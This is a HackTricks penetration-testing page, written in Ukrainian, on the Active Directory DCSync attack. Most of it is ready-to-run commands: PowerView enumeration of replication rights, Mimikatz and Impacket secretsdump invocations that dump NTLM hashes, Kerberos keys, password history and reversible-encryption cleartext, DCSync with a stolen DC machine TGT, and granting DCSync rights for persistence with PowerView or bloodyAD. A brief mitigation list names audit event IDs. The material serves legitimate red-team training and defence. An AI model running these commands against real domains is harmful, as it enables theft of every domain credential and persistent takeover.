# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Дозвіл **DCSync** означає наявність таких прав щодо самого домену: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** і **Replicating Directory Changes In Filtered Set**.

**Важливі примітки про DCSync:**

- Атака **DCSync** імітує поведінку Domain Controller і просить інші Domain Controllers реплікувати інформацію** using the Directory Replication Service Remote Protocol (MS-DRSR). Оскільки MS-DRSR є дійсною та необхідною функцією Active Directory, її не можна вимкнути або відключити.
- За замовчуванням лише групи **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** мають потрібні привілеї.
- На практиці, **full DCSync** потребує **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** у domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` зазвичай делегується разом із ними, але сам по собі він більш важливий для синхронізації **confidential / RODC-filtered attributes** (наприклад legacy LAPS-style secrets), ніж для повного krbtgt dump.
- Якщо будь-які паролі облікових записів збережені з reversible encryption, у Mimikatz є опція повернути пароль у clear text

### Enumeration

Перевірте, хто має ці дозволи, використовуючи `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Якщо ви хочете зосередитися на **non-default principals** із правами DCSync, відфільтруйте вбудовані групи, здатні до реплікації, і перегляньте лише unexpected trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Експлуатувати локально
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Експлуатуйте віддалено
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Практичні приклади в межах scope:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

У сценаріях export-mode з unconstrained-delegation ви можете захопити Domain Controller machine TGT (наприклад, `DC1$@DOMAIN` для `krbtgt@DOMAIN`). Потім ви можете використати цей ccache для автентифікації як DC і виконати DCSync без пароля.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Оперативні примітки:

- **Шлях Kerberos в Impacket спочатку торкається SMB** перед викликом DRSUAPI. Якщо середовище примусово вмикає **SPN target name validation**, повний дамп може завершитися помилкою `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- У такому разі або запросіть service ticket **`cifs/<dc>`** для цільового DC, або перейдіть на **`-just-dc-user`** для потрібного облікового запису негайно.
- Коли у вас є лише нижчі права реплікації, синхронізація типу LDAP/DirSync все ще може показати **confidential** або **RODC-filtered** атрибути (наприклад, legacy `ms-Mcs-AdmPwd`) без повної реплікації krbtgt.

`-just-dc` генерує 3 файли:

- один з **NTLM hashes**
- один з **Kerberos keys**
- один з cleartext passwords з NTDS для будь-яких облікових записів, для яких увімкнено [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Ви можете отримати користувачів із reversible encryption за допомогою

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Якщо ви domain admin, ви можете надати ці permissions будь-якому користувачу за допомогою `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Оператори Linux можуть зробити те саме з `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Потім ви можете **перевірити, чи користувачу було коректно призначено** 3 привілеї, знайшовши їх у виводі (ви повинні бачити назви привілеїв всередині поля "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – Було виконано операцію над об’єктом
- Security Event ID 5136 (Audit Policy for object must be enabled) – Об’єкт служби каталогів було змінено
- Security Event ID 4670 (Audit Policy for object must be enabled) – Права доступу до об’єкта було змінено
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
